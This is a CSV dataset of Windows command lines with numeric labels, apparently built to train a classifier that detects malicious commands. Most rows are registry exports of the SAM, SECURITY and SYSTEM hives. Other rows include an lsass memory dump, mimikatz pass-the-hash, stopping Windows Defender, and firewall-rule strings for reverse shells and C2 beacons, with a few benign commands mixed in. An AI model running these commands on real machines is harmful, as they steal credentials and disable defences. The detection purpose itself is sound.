text,label
reg export hklm\sam c:\windows\temp\udvotx2e.save,1
rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg export hklm\sam c:\windows\temp\dbnqwt8l.save,1
reg save hklm\security c:\windows\temp\p9jx13xu.save,1
reg export hklm\security c:\windows\temp\y0fgh5ob.save,1
reg export hklm\system c:\windows\temp\ru83tcn9.save,1
reg export hklm\security c:\windows\temp\bislztzy.save,1
reg export hklm\sam c:\windows\temp\9kew1wly.save,1
reg save hklm\system c:\windows\temp\4m9e2gjc.save,1
reg save hklm\system c:\windows\temp\3ainwan7.save,1
reg save hklm\sam c:\windows\temp\0lpvs089.save,1
reg save hklm\security c:\windows\temp\0863kovk.save,1
reg save hklm\system c:\windows\temp\sonmr3qt.save,1
reg save hklm\security c:\windows\temp\99z9q9gz.save,1
reg export hklm\sam c:\windows\temp\ohrxnau4.save,1
reg save hklm\sam c:\windows\temp\8jatj3zc.save,1
reg export hklm\sam c:\windows\temp\uy07wzku.save,1
"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
reg save hklm\sam c:\windows\temp\ifso9fwc.save,1
reg save hklm\security c:\windows\temp\7z4g3m8z.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\tm4iprze.save""",1
reg export hklm\system c:\windows\temp\i84hn0dn.save,1
reg export hklm\system c:\windows\temp\p01fm2dr.save,1
reg export hklm\system c:\windows\temp\i543htlp.save,1
reg export hklm\system c:\windows\temp\46xgsrgf.save,1
reg export hklm\system c:\windows\temp\kom4gv0m.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\ytm2qsiy.save""",1
reg export hklm\sam c:\windows\temp\04mtk1kn.save,1
reg save hklm\sam c:\windows\temp\ckw620rd.save,1
reg export hklm\system c:\windows\temp\8y2x4wvm.save,1
reg export hklm\system c:\windows\temp\cokck0id.save,1
reg export hklm\security c:\windows\temp\w1ib2xjc.save,1
reg save hklm\system c:\windows\temp\dymeqy8s.save,1
reg export hklm\system c:\windows\temp\40h9vqtk.save,1
"powershell -nop -c ""sekurlsa::pth""",3
backup-utility  write  hklm\software  to  c:\backups\config.dat,0
reg save hklm\sam c:\windows\temp\ofieynbd.save,1
reg save hklm\security c:\windows\temp\6vinupaz.save,1
reg save hklm\sam c:\windows\temp\vuap9xe3.save,1
reg save hklm\system c:\windows\temp\qr43msvv.save,1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\security c:\windows\temp\0pdqd6cq.save,1
reg save hklm\security c:\windows\temp\xsp510tv.save,1
reg save hklm\sam c:\windows\temp\thmu82b0.save,1
reg save hklm\sam c:\windows\temp\601rkva0.save,1
reg export hklm\system c:\windows\temp\71y99l88.save,1
reg save hklm\sam c:\windows\temp\j0j6nnnu.save,1
reg export hklm\sam c:\windows\temp\42elzhdd.save,1
reg save hklm\security c:\windows\temp\aihekzkw.save,1
reg save hklm\system c:\windows\temp\p9rkf34g.save,1
reg save hklm\system c:\windows\temp\mcrdnnd4.save,1
reg export hklm\system c:\windows\temp\b86ro4le.save,1
reg export hklm\security c:\windows\temp\f6kegv9j.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\ycjj1es6.save""",1
reg save hklm\system c:\windows\temp\vxh2uh0j.save,1
reg export hklm\security c:\windows\temp\m0btt66i.save,1
reg   export   hklm\system   c:\windows\temp\pjuyilyr.save,1
"cmd.exe /c ""python   -m   http.server   8080""",0
reg save hklm\sam c:\windows\temp\pirawd23.save,1
reg export hklm\security c:\windows\temp\e398sfp6.save,1
reg save hklm\security c:\windows\temp\ftshz7ec.save,1
reg  export  hklm\security  c:\windows\temp\4qtgs11h.save,1
reg save hklm\sam c:\windows\temp\7qkxxqs7.save,1
reg save hklm\sam c:\windows\temp\nwk7lf8p.save,1
reg save hklm\sam c:\windows\temp\7sdy5dhl.save,1
reg save hklm\system c:\windows\temp\b3r6jws8.save,1
reg save hklm\security c:\windows\temp\tghqh2v8.save,1
reg save hklm\security c:\windows\temp\xb0hoi0b.save,1
reg export hklm\security c:\windows\temp\efyiojtq.save,1
reg save hklm\system c:\windows\temp\v2599w41.save,1
reg save hklm\system c:\windows\temp\jbya4zf0.save,1
reg save hklm\security c:\windows\temp\nk9lr8ze.save,1
reg save hklm\system c:\windows\temp\3rf0y95s.save,1
reg save hklm\system c:\windows\temp\b3mczwwo.save,1
reg save hklm\system c:\windows\temp\803jm8bp.save,1
reg export hklm\security c:\windows\temp\m4jf9trs.save,1
reg export hklm\sam c:\windows\temp\qnu9fel1.save,1
reg save hklm\sam c:\windows\temp\0jf17mzk.save,1
reg save hklm\sam c:\windows\temp\s8d3s8xz.save,1
reg save hklm\system c:\windows\temp\g7gxdvgh.save,1
reg save hklm\security c:\windows\temp\m9rawh5z.save,1
reg export hklm\security c:\windows\temp\8l3t2rwm.save,1
reg save hklm\system c:\windows\temp\9ozxkkjp.save,1
reg save hklm\system c:\windows\temp\5axsixas.save,1
reg export hklm\sam c:\windows\temp\t61an3yr.save,1
reg export hklm\system c:\windows\temp\ao68dugf.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\pu0o2hys.save""",1
reg export hklm\security c:\windows\temp\kpfhooaj.save,1
reg save hklm\security c:\windows\temp\q81n04hx.save,1
reg save hklm\security c:\windows\temp\b3xbip0l.save,1
reg export hklm\sam c:\windows\temp\dv45z3sd.save,1
reg export hklm\sam c:\windows\temp\nx6kc613.save,1
reg export hklm\system c:\windows\temp\039dafrn.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\7w4l50kj.save""",1
reg export hklm\system c:\windows\temp\jtzp7kbl.save,1
reg export hklm\security c:\windows\temp\zgfll31o.save,1
reg export hklm\system c:\windows\temp\8hgt5qii.save,1
reg save hklm\system c:\windows\temp\u8mvovya.save,1
reg   save   hklm\system   c:\windows\temp\p3i8wb7z.save,1
reg save hklm\system c:\windows\temp\bdlkk5ng.save,1
reg export hklm\system c:\windows\temp\tvhdffu6.save,1
reg export hklm\system c:\windows\temp\v518zpaa.save,1
reg save hklm\security c:\windows\temp\b4njlyg0.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
reg save hklm\sam c:\windows\temp\oa6963r0.save,1
"cmd.exe /c ""ipconfig /all""",0
reg save hklm\security c:\windows\temp\imway3dd.save,1
reg export hklm\system c:\windows\temp\jfkdk84i.save,1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
sc   stop   windefend,2
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\t7gx42yj.save""",1
reg export hklm\sam c:\windows\temp\laraxfch.save,1
reg save hklm\sam c:\windows\temp\sw0495yt.save,1
reg export hklm\sam c:\windows\temp\sgbzzmc6.save,1
reg export hklm\security c:\windows\temp\fgraued0.save,1
reg save hklm\system c:\windows\temp\ffuf02xc.save,1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\mlw4xmk0.save,1
reg export hklm\sam c:\windows\temp\z3w4jt28.save,1
reg save hklm\sam c:\windows\temp\gk21t59k.save,1
reg save hklm\security c:\windows\temp\71hy13tw.save,1
reg save hklm\system c:\windows\temp\3q1vsddn.save,1
reg save hklm\sam c:\windows\temp\557vbxej.save,1
netsh   dump   >   netconfig.txt,0
reg export hklm\security c:\windows\temp\hrfsonbn.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\d52qsl6q.save,1
reg save hklm\sam c:\windows\temp\qmqkxlqt.save,1
reg export hklm\sam c:\windows\temp\adrij83w.save,1
reg export hklm\security c:\windows\temp\0xh8kcdt.save,1
reg export hklm\security c:\windows\temp\5idvf6ks.save,1
reg save hklm\sam c:\windows\temp\qi09d2z2.save,1
reg save hklm\sam c:\windows\temp\sspaobnf.save,1
reg save hklm\sam c:\windows\temp\a9slm33q.save,1
"powershell -nop -c ""runas /user:administrator cmd.exe""",3
reg save hklm\system c:\windows\temp\5z22yv8u.save,1
"powershell -nop -c ""sc  query  windefend""",0
reg export hklm\system c:\windows\temp\3fxpau1p.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\sam c:\windows\temp\v0eue9un.save,1
reg export hklm\system c:\windows\temp\ab3i3iv4.save,1
reg save hklm\system c:\windows\temp\5qavwei8.save,1
reg save hklm\sam c:\windows\temp\ytmlyshy.save,1
reg export hklm\sam c:\windows\temp\zcu2hxt2.save,1
reg save hklm\security c:\windows\temp\03h6uusd.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\htoclta8.save,1
reg save hklm\sam c:\windows\temp\cjrlcp8c.save,1
reg save hklm\security c:\windows\temp\ri989pd5.save,1
reg export hklm\security c:\windows\temp\e3ehj8t0.save,1
reg export hklm\sam c:\windows\temp\wrlovf1u.save,1
reg export hklm\sam c:\windows\temp\gz26w2h6.save,1
reg save hklm\sam c:\windows\temp\2msnfpow.save,1
reg save hklm\security c:\windows\temp\l6kxghwr.save,1
reg save hklm\security c:\windows\temp\581vah2w.save,1
reg save hklm\security c:\windows\temp\lwvfovxh.save,1
reg save hklm\system c:\windows\temp\z3uy86br.save,1
reg export hklm\system c:\windows\temp\3co847wg.save,1
reg save hklm\system c:\windows\temp\g8ep2jtx.save,1
reg save hklm\system c:\windows\temp\8zapmssw.save,1
reg save hklm\system c:\windows\temp\v8r1ukot.save,1
reg export hklm\security c:\windows\temp\iqkcnk37.save,1
reg export hklm\sam c:\windows\temp\ohiw94qk.save,1
reg save hklm\sam c:\windows\temp\mc8k7eek.save,1
reg export hklm\sam c:\windows\temp\bdwlj3h3.save,1
reg export hklm\sam c:\windows\temp\jeo7d47f.save,1
reg export hklm\system c:\windows\temp\mfk2tvjd.save,1
reg save hklm\system c:\windows\temp\pfkwz1oy.save,1
reg export hklm\sam c:\windows\temp\imffe3oi.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\5hxojxoc.save""",1
reg export hklm\sam c:\windows\temp\efwtyero.save,1
reg export hklm\security c:\windows\temp\iajri8w6.save,1
reg export hklm\security c:\windows\temp\ttvtjz34.save,1
reg export hklm\security c:\windows\temp\7lz6oxbw.save,1
reg export hklm\system c:\windows\temp\q5wzw3pi.save,1
reg export hklm\sam c:\windows\temp\s7ottbwi.save,1
reg save hklm\security c:\windows\temp\rjk5y2u1.save,1
reg export hklm\security c:\windows\temp\r2ve7jch.save,1
reg export hklm\security c:\windows\temp\5gaeuar5.save,1
reg export hklm\sam c:\windows\temp\kkg6ryxy.save,1
reg save hklm\sam c:\windows\temp\asjohfdd.save,1
reg export hklm\sam c:\windows\temp\tf5rj4v3.save,1
reg export hklm\system c:\windows\temp\d4mz59e5.save,1
reg save hklm\system c:\windows\temp\g5usednz.save,1
reg save hklm\sam c:\windows\temp\em45or1q.save,1
reg save hklm\system c:\windows\temp\782glamy.save,1
reg export hklm\system c:\windows\temp\mcw1p4rc.save,1
reg   export   hklm\system   c:\windows\temp\njld89gs.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\htgguxwy.save""",1
ping   192.168.1.1,0
"[dllimport(""advapi32.dll"")]  extern  bool  amsiutils(...)",3
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\system c:\windows\temp\8e3ooiyz.save,1
reg export hklm\sam c:\windows\temp\fnio612g.save,1
reg save hklm\security c:\windows\temp\hpxdvqfa.save,1
"powershell -nop -c ""reg query hkcu\console""",0
reg export hklm\sam c:\windows\temp\dlv3il0j.save,1
reg save hklm\sam c:\windows\temp\xdwfdyr2.save,1
reg save hklm\security c:\windows\temp\ldritput.save,1
$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser'),3
"powershell -nop -c ""start  cmd.exe  /c  whoami""",0
reg export hklm\system c:\windows\temp\vjdlkmoq.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\z01xqd2r.save""",1
reg export hklm\system c:\windows\temp\08fcvm6z.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\s.dat""""",1
reg save hklm\sam c:\windows\temp\1ngplt13.save,1
reg export hklm\sam c:\windows\temp\xk05k8db.save,1
sekurlsa::pth,3
reg export hklm\sam c:\windows\temp\ilqu6717.save,1
reg save hklm\security c:\windows\temp\k3fltzbx.save,1
reg export hklm\security c:\windows\temp\hax70j8g.save,1
reg save hklm\sam c:\windows\temp\nho10ai1.save,1
reg  export  hklm\sam  c:\windows\temp\yd2rsycg.save,1
"powershell -nop -c ""c:\windows\system32\svchost.exe  -k  networkservice""",0
reg export hklm\security c:\windows\temp\tuaohy6y.save,1
reg save hklm\security c:\windows\temp\ilk0waum.save,1
reg save hklm\security c:\windows\temp\eau9eizp.save,1
reg save hklm\security c:\windows\temp\5dyvn56n.save,1
reg export hklm\sam c:\windows\temp\y6xsbwdd.save,1
reg export hklm\security c:\windows\temp\rg7wi5vj.save,1
reg export hklm\system c:\windows\temp\wxzvhjk1.save,1
reg export hklm\security c:\windows\temp\55zrbql3.save,1
reg export hklm\security c:\windows\temp\2xr6qmjz.save,1
reg save hklm\sam c:\windows\temp\wlwsoab1.save,1
reg  save  hklm\sam  c:\windows\temp\7k03maj5.save,1
reg save hklm\sam c:\windows\temp\bztfo063.save,1
reg save hklm\system c:\windows\temp\29il377x.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
reg   export   hklm\security   c:\windows\temp\vc5yaf93.save,1
reg save hklm\sam c:\windows\temp\er4z5vqd.save,1
reg export hklm\security c:\windows\temp\kco2oxyb.save,1
reg save hklm\security c:\windows\temp\go6p78pj.save,1
reg export hklm\sam c:\windows\temp\dxag7jmi.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\t7t8ahcm.save""",1
reg save hklm\system c:\windows\temp\0gcayq8i.save,1
reg save hklm\sam c:\windows\temp\v30pl6jm.save,1
reg export hklm\system c:\windows\temp\8divk25c.save,1
reg export hklm\security c:\windows\temp\3h4vwlyt.save,1
reg export hklm\security c:\windows\temp\qr7rnufm.save,1
reg  save  hklm\sam  c:\windows\temp\uvpbvj79.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\t9koxm7x.save""",1
reg save hklm\security c:\windows\temp\ucydtcq2.save,1
reg save hklm\security c:\windows\temp\yzuxvon2.save,1
reg export hklm\security c:\windows\temp\bmvw6caa.save,1
reg   save   hklm\security   c:\windows\temp\2xgwt57b.save,1
reg export hklm\system c:\windows\temp\21z4zxss.save,1
c:\windows\system32\svchost.exe   -k   networkservice,0
reg save hklm\sam c:\windows\temp\rl5w3hs2.save,1
reg save hklm\security c:\windows\temp\1mvhh15n.save,1
reg export hklm\sam c:\windows\temp\yqa71m4j.save,1
reg save hklm\security c:\windows\temp\32w0r3g4.save,1
reg export hklm\sam c:\windows\temp\y30gimmg.save,1
reg save hklm\system c:\windows\temp\q9dwv9ai.save,1
"powershell -nop -c ""reg   save   hklm\system   c:\windows\temp\tkozfjwe.save""",1
reg export hklm\sam c:\windows\temp\o35kx0yy.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\nssfbirs.save""",1
reg save hklm\security c:\windows\temp\nz43aktw.save,1
reg save hklm\security c:\windows\temp\d65s10hp.save,1
reg export hklm\sam c:\windows\temp\6tsymt1h.save,1
reg save hklm\sam c:\windows\temp\8hkpvftd.save,1
reg export hklm\sam c:\windows\temp\4r085785.save,1
reg save hklm\security c:\windows\temp\ifeo85sr.save,1
reg export hklm\security c:\windows\temp\73kz14hs.save,1
reg save hklm\security c:\windows\temp\ple981rb.save,1
reg export hklm\security c:\windows\temp\lbhfjcgx.save,1
reg export hklm\system c:\windows\temp\ujrqz479.save,1
reg export hklm\system c:\windows\temp\t6zwiuh4.save,1
reg export hklm\sam c:\windows\temp\1d40wav3.save,1
reg save hklm\sam c:\windows\temp\rmgkwifj.save,1
reg  export  hklm\sam  c:\windows\temp\y60h30my.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\2jdtffry.save""",1
reg save hklm\system c:\windows\temp\jw1qx7tf.save,1
reg save hklm\sam c:\windows\temp\4wcyp7dw.save,1
reg export hklm\sam c:\windows\temp\qr9oorrn.save,1
"cmd.exe /c ""klist  get  krbtgt/domain.local""",3
reg save hklm\system c:\windows\temp\rvl364t6.save,1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\dcg8lkt6.save""",1
reg save hklm\system c:\windows\temp\5a8cojza.save,1
reg export hklm\sam c:\windows\temp\i72hdelt.save,1
reg save hklm\system c:\windows\temp\uy5r5g4r.save,1
reg save hklm\security c:\windows\temp\o6dkful0.save,1
reg save hklm\sam c:\windows\temp\v2jw9ywj.save,1
reg export hklm\security c:\windows\temp\h6p2logc.save,1
reg save hklm\security c:\windows\temp\dy5nyx2i.save,1
reg export hklm\sam c:\windows\temp\tl0hh89h.save,1
reg save hklm\sam c:\windows\temp\ct98t44b.save,1
reg export hklm\sam c:\windows\temp\dxktixq5.save,1
reg export hklm\system c:\windows\temp\3elff9qy.save,1
reg export hklm\sam c:\windows\temp\10wjnsev.save,1
reg save hklm\system c:\windows\temp\14dhuswa.save,1
reg save hklm\security c:\windows\temp\bgv6904j.save,1
reg save hklm\security c:\windows\temp\e68f14ag.save,1
reg save hklm\system c:\windows\temp\2iwrv9z7.save,1
rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg save hklm\sam c:\windows\temp\j7plzbp4.save""",1
reg export hklm\sam c:\windows\temp\3d1j9hzp.save,1
reg save hklm\system c:\windows\temp\w3iacsg7.save,1
reg export hklm\security c:\windows\temp\bzibtxhs.save,1
reg save hklm\security c:\windows\temp\s6rkzlax.save,1
reg export hklm\system c:\windows\temp\mgcwdazd.save,1
reg export hklm\sam c:\windows\temp\dspfkc77.save,1
reg  save  hklm\system  c:\windows\temp\dq9a9vp2.save,1
reg export hklm\sam c:\windows\temp\vg3akm23.save,1
reg save hklm\sam c:\windows\temp\nonhod5a.save,1
reg export hklm\sam c:\windows\temp\46n4e6s2.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\3b1z247i.save""",1
reg save hklm\system c:\windows\temp\8kt1cyr4.save,1
reg export hklm\sam c:\windows\temp\6357aceq.save,1
reg save hklm\sam c:\windows\temp\6dw306l1.save,1
reg save hklm\system c:\windows\temp\ultyy98j.save,1
reg export hklm\security c:\windows\temp\4lcsss35.save,1
reg export hklm\sam c:\windows\temp\yicu05t4.save,1
reg export hklm\sam c:\windows\temp\x3th3sp3.save,1
reg export hklm\security c:\windows\temp\hr3zkdsi.save,1
reg save hklm\sam c:\windows\temp\yh2j8yh7.save,1
reg export hklm\security c:\windows\temp\kc1e65hs.save,1
reg export hklm\security c:\windows\temp\37k7ux82.save,1
reg export hklm\sam c:\windows\temp\3gq738ih.save,1
reg save hklm\sam c:\windows\temp\croipw1n.save,1
